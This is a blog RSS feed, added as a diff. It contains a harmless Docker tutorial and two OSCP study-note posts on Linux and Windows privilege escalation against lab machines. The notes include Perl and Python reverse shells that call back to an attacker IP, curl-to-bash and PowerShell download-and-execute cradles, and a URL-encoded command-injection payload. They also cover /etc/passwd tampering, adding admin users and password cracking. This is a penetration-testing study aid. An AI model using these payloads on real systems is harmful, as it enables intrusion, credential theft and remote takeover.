@@ -1,0 +1,1708 @@
+<?xml version="1.0" encoding="utf-8"?>
+<rss version="2.0"><channel><title>Daniel Haggerty's Blog - Daniel</title><link>/</link><description></description><lastBuildDate>Sat, 18 Jan 2020 00:00:00 -0600</lastBuildDate><item><title>"Docker Commands"</title><link>/docker-commands.html</link><description>&lt;ul&gt;
+&lt;li&gt;Dev Ops
+tags:&lt;/li&gt;
+&lt;li&gt;Docker&lt;/li&gt;
+&lt;li&gt;Kubernetes&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h3&gt;Docker&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;docker run dans-container
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Is equivalent too&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;docker create dans-container
+docker start dans-container
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;If:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;docker run busybox ping google.com
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;To view that container still running:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;docker ps
+docker ps --all
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;To stop container: &lt;code&gt;docker stop&lt;/code&gt; tries to cleanup, &lt;code&gt;docker kill&lt;/code&gt; is more brutal.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;docker stop containerid
+docker &lt;span class="nb"&gt;kill&lt;/span&gt; containerid
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;To get a shell inside a running container:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;docker run redis
+&lt;span class="c1"&gt;# Then in a second Docker Terminal&lt;/span&gt;
+docker &lt;span class="nb"&gt;exec&lt;/span&gt; -it containerid sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;To get straight into the shell at container startup:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;docker run -it busybox sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Stop and remove all containers. &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;docker stop &lt;span class="k"&gt;$(&lt;/span&gt;docker ps -a -q&lt;span class="k"&gt;)&lt;/span&gt;
+docker rm &lt;span class="k"&gt;$(&lt;/span&gt;docker ps -a -q&lt;span class="k"&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h1&gt;NODE APP&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;index.js&lt;/strong&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;express&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;express&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+
+&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;app&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;express&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+
+&lt;span class="nx"&gt;app&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Docker deployment of minimal node app&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="p"&gt;});&lt;/span&gt;
+
+&lt;span class="nx"&gt;app&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;listen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;8080&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;listening on port 8080&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="p"&gt;});&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;package.json&lt;/strong&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="nt"&gt;&amp;quot;dependencies&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:{&lt;/span&gt;
+        &lt;span class="nt"&gt;&amp;quot;express&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;*&amp;quot;&lt;/span&gt;
+    &lt;span class="p"&gt;},&lt;/span&gt;
+    &lt;span class="nt"&gt;&amp;quot;scripts&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="nt"&gt;&amp;quot;start&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot; node index.js&amp;quot;&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Dockerfile&lt;/strong&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c"&gt;# Specify a base image, node alpine is stripped down node.&lt;/span&gt;
+&lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="s"&gt;node:alpine&lt;/span&gt;
+
+&lt;span class="c"&gt;# put app into a dedicated folder in container&lt;/span&gt;
+&lt;span class="k"&gt;WORKDIR&lt;/span&gt;&lt;span class="s"&gt; /usr/app&lt;/span&gt;
+
+&lt;span class="c"&gt;# package.json has to be available before npm install&lt;/span&gt;
+&lt;span class="k"&gt;COPY&lt;/span&gt; ./package.json ./
+
+&lt;span class="c"&gt;# Install some dependencies&lt;/span&gt;
+&lt;span class="k"&gt;RUN&lt;/span&gt; npm install
+
+&lt;span class="c"&gt;# copy rest of files after npm install&lt;/span&gt;
+&lt;span class="k"&gt;COPY&lt;/span&gt; ./* ./
+
+&lt;span class="c"&gt;# Default command&lt;/span&gt;
+&lt;span class="k"&gt;CMD&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;npm&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;start&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Any incoming request made to my port 8080 that request is mapped to the container.&lt;/p&gt;
+&lt;p&gt;Port forwarding is a runtime constraint &lt;code&gt;-p 8080:8080&lt;/code&gt; and not required in Dockerfile&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;docker build -t danhagg/node_app:latest .
+
+docker run -p &lt;span class="m"&gt;8080&lt;/span&gt;:8080 danhagg/node_app
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Visit http://192.168.99.100:8080/ and view the app.&lt;/p&gt;
+&lt;p&gt;Get a shell inside the running docker containing. Note that we enter into WORKDIR delcared in Dockerfile.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;docker &lt;span class="nb"&gt;exec&lt;/span&gt; -it b24326768f29 sh
+/usr/app &lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h1&gt;Use docker-compose for multiple containers&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;index.js&lt;/strong&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;express&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;express&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;redis&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;redis&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+
+&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;app&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;express&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;client&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;redis&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;createClient&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;
+    &lt;span class="nx"&gt;host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;redis-server&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+    &lt;span class="nx"&gt;port&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;6379&lt;/span&gt;
+&lt;span class="p"&gt;});&lt;/span&gt;
+&lt;span class="nx"&gt;client&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;set&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;visits&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+
+&lt;span class="nx"&gt;app&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="nx"&gt;client&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;visits&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;visits&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;number of visits is &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;visits&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+        &lt;span class="nx"&gt;client&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;set&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;visits&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;parseInt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;visits&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="p"&gt;});&lt;/span&gt;
+&lt;span class="p"&gt;});&lt;/span&gt;
+
+&lt;span class="nx"&gt;app&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;listen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;8081&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Listening on port 8081&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="p"&gt;});&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;dockerfile&lt;/strong&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;node&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;alpine&lt;/span&gt;
+
+&lt;span class="n"&gt;WORKDIR&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/app&amp;#39;&lt;/span&gt;
+
+&lt;span class="k"&gt;COPY&lt;/span&gt; &lt;span class="n"&gt;package&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;json&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt;
+
+&lt;span class="n"&gt;RUN&lt;/span&gt; &lt;span class="n"&gt;npm&lt;/span&gt; &lt;span class="n"&gt;install&lt;/span&gt;
+
+&lt;span class="k"&gt;COPY&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt;
+
+&lt;span class="n"&gt;CMD&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;&amp;quot;npm&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ss"&gt;&amp;quot;start&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;docker-compose.yml&lt;/strong&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c"&gt;version: &amp;#39;3&amp;#39;&lt;/span&gt;
+&lt;span class="c"&gt;services:&lt;/span&gt;
+&lt;span class="c"&gt;  redis-server:&lt;/span&gt;
+&lt;span class="c"&gt;    image: &amp;#39;redis&amp;#39;&lt;/span&gt;
+&lt;span class="c"&gt;  node-app:&lt;/span&gt;
+&lt;span class="c"&gt;    restart: always&lt;/span&gt;
+&lt;span class="c"&gt;    build: .&lt;/span&gt;
+&lt;span class="c"&gt;    ports:&lt;/span&gt;
+&lt;span class="c"&gt;      - &amp;quot;4001:8081&amp;quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;The commands are different if we have a docker-compose.yml.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# To build and run&lt;/span&gt;
+docker-compose up --build
+
+&lt;span class="c1"&gt;# To run already built container&lt;/span&gt;
+docker-compose up
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;More docker-cmpose commands&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# Launch in background&lt;/span&gt;
+docker-compose up -d
+
+&lt;span class="c1"&gt;#stop&amp;amp;remove containers started above&lt;/span&gt;
+docker-compose down
+
+&lt;span class="c1"&gt;# View running containers. &lt;/span&gt;
+&lt;span class="c1"&gt;# Must be in same folder as docker-compose.yml&lt;/span&gt;
+docker-compose ps
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">Daniel</dc:creator><pubDate>Sat, 18 Jan 2020 00:00:00 -0600</pubDate><guid isPermaLink="false">tag:None,2020-01-18:/docker-commands.html</guid><category>misc</category></item><item><title>"OSCP: Linux Privilege Escalation"</title><link>/oscp-linux-privilege-escalation.html</link><description>&lt;ul&gt;
+&lt;li&gt;Cyber Security
+tags:&lt;/li&gt;
+&lt;li&gt;OSCP&lt;/li&gt;
+&lt;li&gt;Linux&lt;/li&gt;
+&lt;li&gt;Privilege Escalation&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;p&gt;privesc_linux
+UPGRADE SHELL python -c ‘import pty; pty.spawn("bin/bash")’
+ctrl-Z
+stty raw -echo
+fg
+Enumerate and run this:
+which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2&amp;gt;/dev/null
+”_ If you don’t see a compiler such as GCC, you know it’s probably not going to be a kernel exploit. So enumerate and use
+LinEnum.sh or Linuxprivescchecker.py. I found on one of my 20 point boxes it only perl and wget, so I was looking for priv esc
+related to perl. The other 20 pointer had GCC, so I googled a linux exploit, 2 minutes later I am root.
+BY HAND 1. sudo -l # view users rights has to be tried first for all linux privesc
+2. rw on /etc/passwd → echo root::0:0:root:/root:/bin/bash &amp;gt; /etc/passwd → su
+3. bash_history
+4. find / -perm -4000 2&amp;gt;/dev/null # SUID files - detect by date?
+5. Do all cronjobs look normal and do you have write access to any??
+6. ps aux | grep root == john mysql -u root
+7. If webserver poke around database
+8. Look at original nmap scan for other shite running (nmap localhost)
+sudo -u anotheruser command run sommand as another user
+sudo -u scriptmanager bash -i #run shell as user scriptmanager
+which awk perl python ruby gcc cc vi vim nmap find netcat nc wget curl tftp ftp 2&amp;gt;/dev/null
+DOWNLOAD ALL LINUX ENUM FILES TO VICTIM cd /opt/linux_privesc
+python -m SimpleHTTPServer
+wget -r 10.10.14.7:8000
+curl 10.10.14.7/LinEnum | bash # pipe into bash
+or save to victim
+linEnum.sh has a -t flag for thorough!!
+make a thorough linEnum script bu putting thorough = 1 at top of script
+KERNEL EXPLOITS i686 = 32bit
+x86_64 = 64bit
+when u pop a box what usernames and info did you get on the way in that may help
+Get Linux version from Apache version etc... Launchpad?
+linux exploit suggester
+the exploit will give linux version + exploitable file
+check your own file version
+eg
+ldd --version
+cat /etc/lsb-release
+Can ignore warnings on gcc compiles
+LINUX VERSIONS
+ubuntu 2.2.22 apache → launchpad link → prcise
+Google ubuntu releases wiki.ubuntu.com/Releases → End of Lifes?
+nmap --script vuln -oA nmap/vulns 10.10.10.79
+Freebsd uses csh shell
+LINUX PASSWORDS unshadow passwd.txt shadow.txt &amp;gt; unshadowed.txt
+john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
+42/67
+WRITABLE /etc/passwd (Bank) Create encrypted password and place in passwd file
+openssl passwd --help
+openssl passwd dan
+dfVJQnZOraiAw
+openssl passwd -1 dan # specifies md5
+vi /etc/passwd
+replace
+root:x:0:0:root:/root:/bin/bash
+with
+root:dfVJQnZOraiAw:0:0:root:/root:/bin/bash
+su root
+Password: dan
+SUID (Bank) find / -perm -4000 2&amp;gt;/dev/null
+/var/htb/bin/emergency
+$ ls -la /var/htb/bin/emergency
+-rwsr-xr-x 1 root root 112204 Jun 14 2017 /var/htb/bin/emergency
+Just run the binary and gain root
+/var/htb/bin/emergency
+That was simple (will often need to edit binary)
+ESCALATE VIA MYSQL ROOT credentials → go into mysql as root then drop ito a shell to pwn box
+mysql -u root -p
+Enter password: !@#S3cur3P4ssw0rd!@#
+Create shell in mysql
+! /bin/sh
+DIDNT ESCALATE
+sudo -l sudo -l
+User shelly may run the following commands on Shocker:
+(root) NOPASSWD: /usr/bin/perl
+Get the pentest monkey perl shell
+Important to add sudo before
+sudo /usr/bin/perl -e 'use Socket;$i="10.10.14.7";
+$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))
+{open(STDIN,"&amp;gt;&amp;amp;S");open(STDOUT,"&amp;gt;&amp;amp;S");open(STDERR,"&amp;gt;&amp;amp;S");exec("/bin/sh -i");};'
+A cronjob (of sorts) test.py owned by us (we are scriptmanager). But note the output (test.txt) is root.
+Goody gumdrops.
+Put in a new test.py.
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.7",
+4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+Open listener on KALI: nc -nlvp 4444
+Serve it it to victim's scripts folder
+Let the cronjob run → shell
+43/67
+RESTRICTED BASH To view what we CAN run
+monitor@waldo:~$ echo $PATH
+/home/monitor/bin:/home/monitor/app-dev:/home/monitor/app-dev/v0.1
+ls /home/monitor/bin
+ls most red rnano
+ls -la /home/monitor/app-dev
+total 2236
+drwxrwx--- 3 app-dev monitor 4096 May 3 2018 .
+drwxr-x--- 5 root monitor 4096 Jul 24 2018 ..
+-rwxrwx--- 1 app-dev monitor 13704 Jul 24 2018 logMonitor
+rwx-able if we are in monitor group?
+rnano /etc/group
+monitor:x:1001: ← yes
+We will copy /bin/bash and paste it over logMonitor
+red /bin/bash ← restricted edit
+1099016
+w app-dev/logMonitor &amp;lt;- write to logMonitorcd ~
+1099016
+q
+logMonitor
+tmp.tUiSCVyRTR: dircolors: command not found
+We now have /bin/bash BUT we can still only do whats in our path. BUT... we can echo a normal path (from kali) and set it on
+Waldo
+ON KALI
+echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/go/bin:/root/go-workspace/bin
+ON WALDO
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/go/bin:/root/go-workspace/bin
+GET LINENUM WITH CURL
+root@kali:/opt/linux_privesc# python -m SimpleHTTPServer
+Serving HTTP on 0.0.0.0 port 8000 ...
+curl 10.10.14.11:8000/linEnumThorough.sh | bash
+[+] Files with POSIX capabilities set:
+/usr/bin/tac = cap_dac_read_search+ei
+/home/monitor/app-dev/v0.1/logMonitor-0.1 = cap_dac_read_search+ei
+[+] Capabilities associated with the current user:
+cap_dac_read_search ←
+[+] Permissions of files with the same capabilities associated with the current user:
+-rwxr-xr-x 1 root root 39752 Feb 22 2017 /usr/bin/tac
+man capabilities
+CAP_DAC_READ_SEARCH
+* Bypass file read permission checks and directory read and execute permission checks;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">Daniel</dc:creator><pubDate>Fri, 01 Nov 2019 00:00:00 -0500</pubDate><guid isPermaLink="false">tag:None,2019-11-01:/oscp-linux-privilege-escalation.html</guid><category>misc</category></item><item><title>"OSCP: Windows Privilege Escalation"</title><link>/oscp-windows-privilege-escalation.html</link><description>&lt;ul&gt;
+&lt;li&gt;Cyber Security
+tags:&lt;/li&gt;
+&lt;li&gt;OSCP&lt;/li&gt;
+&lt;li&gt;Windows&lt;/li&gt;
+&lt;li&gt;Privilege Escalation&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;icacls scsiaccess.exe&lt;/span&gt;
+&lt;span class="err"&gt;...&lt;/span&gt;
+&lt;span class="c"&gt;Everyone: (I)(F)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;crosscompile useradd.c
+i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c
+wce -w
+fgdump.exe
+type 127.0.0.1.pwdump
+john --wordlist=/usr/share/wordlists/rockyou.txt 127.0.0.1.pwdump
+Is there python on dev windows machine
+Use pyinstaller on dev windows machine
+python pyinstaller.py --onefile ms11-080.py
+Check for powershell
+powershell whoami
+whaomi /priv
+cmdkey /list
+run an exploit suggesters
+If web server poke around databasel
+Check if I can write in folder
+echo PleaseSubsribe &amp;gt; test
+1. Nishang
+2. unicorn → meterpreter from a standard shell
+UPGRADE TO NISHANG 1. Locate the PS &amp;gt; Invoke...reverse shell line in script and put at bottom so it executes in memory after transfer
+2. Server python -m SimpleHTTPServer 80
+3. powershell “IEX(New-Object NetWebClient).downloadString('http://10.10.14.7:8000/InvokePowerShellTcp.ps1')”
+net user dan dan /add; net local
+UNICORN
+Exploit suggesters • Sherlock.ps1
+• Powerup.ps1 → service misconfigs
+• Exploit suggester ./windows-exploit-suggester.py
+python windows-exploit-suggester.py -d 2017-05-27-mssb.xls -i systeminfo.txt
+• jaws-enum.ps1
+• Empire??
+Sherlock.ps1
+windows-exploit-suggester.py
+Empire
+PowerUp.ps1
+46/67
+locate PowerUp.ps1. Copy then add “Invoke-AllChecks” to end
+http://10.10.10.9/ippsec.php?fexec=echo%20IEX(New-Object%20Net.WebClient).DownloadString(%27http://10.10.14.11:8000/
+PowerUp.ps1%27)%20|%20powershell%20-noprofile%20-
+Run Invokes from memory as the file transferred
+powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8000/jaws-enum.ps1')"
+1. jaws-enum.ps1 JAWS enumeration
+Currently stored credentials:
+Target: Domain:interactive=ACCESS\Administrator
+Type: Domain Password
+User: ACCESS\Administrator
+BURP (ctr-U to url encode the following)
+%00{.exec|c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object
+NetWebClient).downloadString('http://10.10.14.7:8000/InvokePowerShellTcp.ps1').}
+powershell -ExecutionPolicy Bypass -File xyz.ps1
+group Administrators dan /add
+rdesktop 10.10.10.10 -u dan
+2. jaws-enum.ps1 powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8000/jaws-enum.ps1')"
+JAWS enumeration
+Currently stored credentials:
+Target: Domain:interactive=ACCESS\Administrator
+Type: Domain Password
+User: ACCESS\Administrator
+PS C:\Users\Public\Desktop&amp;gt; dir
+"ZKAccess3.5 Security System.lnk"
+GET FILE CONTENTS SO WE KNOW HOW TO RUN AS ADMIN
+get-Content "ZKAccess3.5 Security System.lnk" == linux “file”
+$WScript = New-Object -ComObject Wscript.Shell
+$shortcut = Get-ChildItem *.lnk
+$Wscript.CreateShortcut($shortcut)
+FullName : C:\Users\Public\Desktop\ZKAccess3.5
+Security System.lnk
+Arguments : /user:ACCESS\Administrator /savecred
+"C:\ZKTeco\ZKAccess3.5\Access.exe"
+Description :
+Hotkey :
